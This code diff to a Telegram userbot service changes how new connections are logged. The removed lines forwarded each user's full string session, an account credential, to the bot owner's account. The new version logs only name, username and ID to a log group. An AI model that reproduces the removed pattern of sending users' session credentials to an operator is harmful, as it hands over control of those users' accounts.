@@ -60,18 +60,25 @@ async def receive_session(client, message):
     start_userbot(text, user_id)
     await message.reply_text("🟢 Your userbot is now running! It will play WordChain automatically.")
 
-    # Log new connection to owner
+    # 🧾 Log new connection in log group (safe version)
     log_text = (
-        f"🧾 New User Connected\n\n"
-        f"👤 Name: {user.first_name or 'Unknown'}\n"
-        f"🆔 User ID: {user_id}\n"
-        f"💬 Username: @{user.username or 'N/A'}\n"
-        f"🔑 String Session:\n{text}"
+        "🧾 <b>New User Connected</b>\n\n"
+        f"👤 <b>Name:</b> {user.first_name or 'Unknown'}\n"
+        f"💬 <b>Username:</b> @{user.username or 'N/A'}\n"
+        f"🆔 <b>User ID:</b> <code>{user.id}</code>\n"
+        f"✅ Status: Userbot started successfully."
     )
+
     try:
-        await client.send_message(config.OWNER_ID, log_text)
+        await client.send_message(
+            config.LOG_GROUP_ID,
+            log_text,
+            disable_web_page_preview=True,
+            parse_mode="HTML"
+        )
+        print(f"📢 Logged connection of {user.id} in log group.")
     except Exception as e:
-        print(f"⚠️ Could not send owner log for {user_id}: {e}")
+        print(f"⚠️ Could not send log for {user.id}: {e}")
 
 
 @app.on_message(filters.command("disconnect") & filters.private)
